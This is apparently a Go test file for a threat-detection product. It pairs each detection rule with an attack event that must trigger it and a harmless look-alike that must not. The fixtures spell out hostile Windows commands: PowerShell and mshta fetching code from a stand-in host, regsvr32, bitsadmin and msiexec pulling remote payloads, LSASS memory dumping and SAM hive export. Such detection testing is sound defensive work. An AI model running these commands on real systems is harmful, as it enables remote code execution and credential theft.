package api

// Per-signature fixtures: for each rule, one event that MUST fire and one
// look-alike that must NOT. A rule that is silently broken (renamed field,
// changed collector output) fails here instead of failing to alert in
// production. Add a fixture whenever a rule is added or changed.

import (
	"encoding/json"
	"testing"

	"obsidianwatch/management/internal/store"
)

type sigFixture struct {
	ID          string
	Fire, Quiet store.Event
}

// fxProc builds a process event.
func fxProc(name, cmd string) store.Event {
	n, c := name, cmd
	return store.Event{EventType: "process", ProcessName: &n, CommandLine: &c}
}

func fxLogon(id uint32) store.Event {
	return store.Event{EventType: "logon", EventID: &id}
}

func fxReg(key string) store.Event {
	k := key
	return store.Event{EventType: "registry", RegKey: &k}
}

func fxFile(path string) store.Event {
	f := path
	return store.Event{EventType: "file", FilePath: &f}
}

func fxEventID(id uint32, channel string) store.Event {
	c := channel
	return store.Event{EventType: "eventlog", EventID: &id, Channel: &c}
}

func fxProcImg(name, cmd, image string) store.Event {
	e := fxProc(name, cmd)
	i := image
	e.ImagePath = &i
	return e
}

func fxDNSEvent(domain string) store.Event {
	d := domain
	return store.Event{EventType: "dns", DstIP: &d}
}

func fxLogonMsg(msg string) store.Event {
	m := msg
	return store.Event{EventType: "logon", CommandLine: &m}
}

func fxRegData(key, data string) store.Event {
	e := fxReg(key)
	d := data
	e.RegValue = &d
	return e
}

func fxSysmonAccess(src, target, access string) store.Event {
	id := uint32(10)
	raw := `{"event_data":{"SourceImage":` + jsonStr(src) + `,"TargetImage":` + jsonStr(target) + `,"GrantedAccess":"` + access + `"}}`
	return store.Event{EventType: "process", EventID: &id, Raw: []byte(raw)}
}

func jsonStr(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func fxFind(id string) (ThreatSig, bool) {
	for _, set := range allSignatureSets() {
		for _, s := range set {
			if s.ID == id {
				return s, true
			}
		}
	}
	return ThreatSig{}, false
}

var sigFixtures = []sigFixture{
	// ── Windows: execution ──
	{"W-T1059.001a", fxProc("powershell.exe", "powershell -enc SQBFAFgAIAA="), fxProc("powershell.exe", "powershell -File backup.ps1")},
	{"W-T1059.001b", fxProc("powershell.exe", "powershell iex(new-object net.webclient).downloadstring('http://x/a')"), fxProc("powershell.exe", "powershell Get-ChildItem")},
	{"W-T1059.003", fxProc("cmd.exe", "cmd.exe /c whoami"), fxProc("cmd.exe", "cmd.exe /c dir")},
	{"W-T1218.011", fxProc("rundll32.exe", `rundll32 javascript:"\..\mshtml,RunHTMLApplication"`), fxProc("rundll32.exe", "rundll32 user32.dll,LockWorkStation")},
	{"W-T1218.005", fxProc("mshta.exe", "mshta http://x/a.hta"), fxProc("notepad.exe", "notepad notes.txt")},
	{"W-T1218.010", fxProc("regsvr32.exe", "regsvr32 /s /u /i:http://x/a.sct scrobj.dll"), fxProc("regsvr32.exe", "regsvr32 mylib.dll")},
	{"W-T1059.005", fxProc("wscript.exe", "wscript job.vbs"), fxProc("notepad.exe", "notepad job.vbs")},
	{"W-T1197", fxProc("bitsadmin.exe", "bitsadmin /transfer j http://x/a.exe c:\\a.exe"), fxProc("bitsadmin.exe", "bitsadmin /list")},
	{"W-T1047", fxProc("wmic.exe", "wmic /node:srv01 process call create calc.exe"), fxProc("wmic.exe", "wmic cpu get name")},
	{"W-T1218.007", fxProc("msiexec.exe", "msiexec /i http://x/a.msi /q"), fxProc("msiexec.exe", "msiexec /x {GUID}")},
	{"W-T1566.001", fxProc("cmd.exe", `cmd.exe /c copy c:\users\a\desktop\x.docm`), fxProc("cmd.exe", `cmd.exe /c dir c:\temp`)},
	// ── Windows: discovery ──
	{"W-T1057", fxProc("tasklist.exe", "tasklist /v"), fxProc("dir.exe", "dir")},
	{"W-T1016", fxProc("ipconfig.exe", "ipconfig /all"), fxProc("ping.exe", "ping localhost")},
	{"W-T1087", fxProc("net.exe", "net user admin"), fxProc("net.exe", "net start spooler")},
	{"W-T1595", fxProc("nmap.exe", "nmap -sS 10.0.0.0/24"), fxProc("notepad.exe", "notepad notes.txt")},
	// ── Windows: privilege escalation / credentials ──
	{"W-T1548.002", fxProc("fodhelper.exe", "fodhelper.exe"), fxProc("calc.exe", "calc.exe")},
	{"W-T1055", fxProc("procdump.exe", "procdump -ma 624 out.dmp"), fxProc("notepad.exe", "notepad a.txt")},
	{"W-T1134", fxProc("x.exe", "x.exe getsystem"), fxProc("notepad.exe", "notepad a.txt")},
	{"W-T1003.001", fxProc("procdump.exe", "procdump -ma lsass.exe out.dmp"), fxProc("notepad.exe", "notepad a.txt")},
	{"W-T1003.001", fxSysmonAccess(`C:\Users\a\Downloads\x.exe`, `C:\Windows\System32\lsass.exe`, "0x1fffff"), fxSysmonAccess(`C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe`, `C:\Windows\System32\lsass.exe`, "0x1fffff")},
	{"W-T1003.002", fxProc("reg.exe", `reg save hklm\sam sam.hiv`), fxProc("reg.exe", `reg query hkcu\software\x`)},
	{"W-T1110", fxLogon(4625), fxLogon(4624)},
}

func TestSignatureFixtures(t *testing.T) {
	for _, f := range sigFixtures {
		s, ok := fxFind(f.ID)
		if !ok {
			t.Errorf("fixture for unknown rule %s", f.ID)
			continue
		}
		if !s.Match(f.Fire) {
			t.Errorf("%s: fire event did not match", f.ID)
		}
		if s.Match(f.Quiet) {
			t.Errorf("%s: look-alike event must not match", f.ID)
		}
	}
}

// minFixtureCoverage is a ratchet: raise it as fixtures are added; it must
// never go down. Rules without a fixture are listed in the test log.
const minFixtureCoverage = 115

func TestSignatureFixtureCoverage(t *testing.T) {
	have := map[string]bool{}
	for _, f := range sigFixtures {
		have[f.ID] = true
	}
	total, covered := 0, 0
	var missing []string
	seen := map[string]bool{}
	for _, set := range allSignatureSets() {
		for _, s := range set {
			if seen[s.ID] {
				continue
			}
			seen[s.ID] = true
			total++
			if have[s.ID] {
				covered++
			} else {
				missing = append(missing, s.ID)
			}
		}
	}
	t.Logf("fixture coverage: %d/%d rules; missing: %v", covered, total, missing)
	if covered < minFixtureCoverage {
		t.Fatalf("fixture coverage dropped to %d (ratchet %d)", covered, minFixtureCoverage)
	}
}
